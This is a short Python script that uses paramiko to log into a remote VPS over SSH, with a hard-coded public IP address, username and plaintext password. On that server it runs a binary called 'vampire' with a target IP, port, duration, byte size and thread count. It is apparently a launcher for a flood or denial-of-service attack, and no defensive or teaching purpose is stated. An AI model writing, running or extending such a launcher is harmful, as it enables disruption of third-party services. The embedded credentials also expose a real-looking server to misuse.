import paramiko

# Remote VPS details (replace with your VPS details)
VPS = {
    'ip': '35.154.151.44',       # Example: '192.168.1.2'
    'username': 'ubuntu',  # VPS SSH username
    'password': 'dhanraj'  # VPS SSH password
}

# Function to execute attack command on remote VPS
def execute_attack_on_vps(ip, port, duration, byte_size, threads):
    try:
        # Create an SSH client
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

        # Connect to the remote VPS using SSH (with password)
        ssh.connect(VPS['ip'], username=VPS['username'], password=VPS['password'])

        # Prepare the command to execute on remote VPS (dynamically pass parameters)
        command = f"./vampire {ip} {port} {duration} {byte_size} {threads}"

        # Execute the command
        stdin, stdout, stderr = ssh.exec_command(command)

        # Wait for the output and error of the command
        stdout_str = stdout.read().decode()
        stderr_str = stderr.read().decode()

        # Print command output (for debugging)
        if stdout_str:
            print(f"[{VPS['ip']}] stdout:\n{stdout_str}")
        if stderr_str:
            print(f"[{VPS['ip']}] stderr:\n{stderr_str}")

        # Close SSH connection
        ssh.close()

    except Exception as e:
        print(f"Error executing attack on {VPS['ip']}: {e}")

# Example usage (attack with IP, port, duration, byte_size, threads)
execute_attack_on_vps('127.0.0.1', '25465', 180, 1024, 9)
